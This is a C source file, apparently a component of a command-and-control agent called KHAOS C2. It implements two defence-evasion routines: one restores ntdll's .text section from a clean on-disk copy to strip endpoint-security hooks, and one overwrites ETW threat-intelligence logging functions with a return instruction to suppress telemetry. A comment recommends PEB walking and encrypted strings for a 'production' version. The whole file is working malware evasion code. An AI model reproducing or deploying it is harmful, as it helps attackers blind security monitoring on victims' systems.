#include "ntdll_unhook.h"
#include <windows.h>
#include <string.h>
#include <stdint.h>

/*
 * PoC note: uses GetModuleHandleA/GetProcAddress with plaintext strings.
 * In production, replace with a PEB walk and encrypted string storage.
 * See agent/src/evasion/evasion.c in KHAOS C2 for the hardened version.
 */

/* NtProtectVirtualMemory — used instead of VirtualProtect to avoid
 * hooking the hook-removal function itself. */
typedef NTSTATUS (NTAPI *NtPVM_t)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);

static NtPVM_t _get_ntpvm(void)
{
    static NtPVM_t fn = NULL;
    if (!fn)
        fn = (NtPVM_t)(void *)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");
    return fn;
}

static BOOL _nt_prot(LPVOID addr, SIZE_T sz, DWORD prot, DWORD *old)
{
    NtPVM_t fn = _get_ntpvm();
    if (!fn) return FALSE;
    PVOID  base = addr;
    SIZE_T rsz  = sz;
    ULONG  _old = 0;
    NTSTATUS st = fn((HANDLE)(LONG_PTR)-1, &base, &rsz, (ULONG)prot, &_old);
    if (old) *old = (DWORD)_old;
    return st == 0;
}

int ntdll_unhook(void)
{
    /* Build ntdll.dll path: GetSystemDirectoryW + \ntdll.dll */
    WCHAR path[MAX_PATH];
    UINT dir_len = GetSystemDirectoryW(path, MAX_PATH);
    if (!dir_len || dir_len > MAX_PATH - 12) return -1;

    const WCHAR suffix[] = {
        L'\\',L'n',L't',L'd',L'l',L'l',L'.',L'd',L'l',L'l',L'\0'
    };
    for (int i = 0; suffix[i]; i++) path[dir_len + i] = suffix[i];
    path[dir_len + 10] = L'\0';

    /* Map ntdll from disk via SEC_IMAGE — kernel validates the PE,
     * bypasses any filesystem filter hooks, gives us a clean image. */
    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;

    HANDLE hMap = CreateFileMappingW(hFile, NULL,
                                     PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hMap) return -1;

    LPVOID disk = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!disk) return -1;

    int rc = -1;

    /* Get live ntdll base */
    HMODULE live = GetModuleHandleA("ntdll.dll");
    if (!live) goto cleanup;

    /* Walk PE sections to find .text */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)disk;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) goto cleanup;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)((BYTE *)disk + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) goto cleanup;

    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        if (memcmp(sec->Name, ".text", 5) != 0) continue;

        LPVOID live_text = (BYTE *)live + sec->VirtualAddress;
        LPVOID disk_text = (BYTE *)disk + sec->VirtualAddress;
        SIZE_T text_sz   = sec->Misc.VirtualSize;

        DWORD old;
        if (!_nt_prot(live_text, text_sz, PAGE_EXECUTE_READWRITE, &old))
            break;
        memcpy(live_text, disk_text, text_sz);
        _nt_prot(live_text, text_sz, old, &old);
        rc = 0;
        break;
    }

cleanup:
    UnmapViewOfFile(disk);
    return rc;
}

int ntdll_patch_etw_ti(void)
{
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    /* ETW-TI functions that report process/memory/handle activity to the
     * kernel ETW provider — patching them suppresses cross-process telemetry. */
    static const char *targets[] = {
        "EtwTiLogOpenProcess",
        "EtwTiLogReadWriteVm",
        "EtwTiLogDuplicateHandle",
    };

    int patched = 0;
    for (int i = 0; i < 3; i++) {
        BYTE *fn = (BYTE *)(void *)GetProcAddress(ntdll, targets[i]);
        if (!fn) continue;

        DWORD old;
        if (!_nt_prot(fn, 1, PAGE_EXECUTE_READWRITE, &old)) continue;
        *fn = 0xC3;  /* RET */
        _nt_prot(fn, 1, old, &old);
        patched++;
    }
    return patched;
}
